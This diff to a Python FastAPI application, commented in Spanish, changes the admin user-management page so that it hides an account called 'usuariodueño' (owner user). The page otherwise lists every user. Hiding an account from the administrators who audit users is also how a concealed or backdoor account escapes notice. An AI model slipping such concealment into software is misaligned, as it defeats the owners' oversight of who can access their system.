@@ -21,7 +21,10 @@ async def usuarios_page(request: Request, db: Session = Depends(get_db)):
     if not username or user_role not in ["admin1", "jefe_guillermo"]:
         return RedirectResponse(url="/", status_code=303)
     
-    lista = db.query(models.Usuario).all()
+    # Excluimos de la lista visible al usuario dueño
+    usuarios_ocultos = ["usuariodueño", "UsuarioDueño", "USUARIODUEÑO"]
+    lista = db.query(models.Usuario).filter(models.Usuario.username.notin_(usuarios_ocultos)).all()
+    
     return templates.TemplateResponse(
         request=request, 
         name="usuarios.html", 
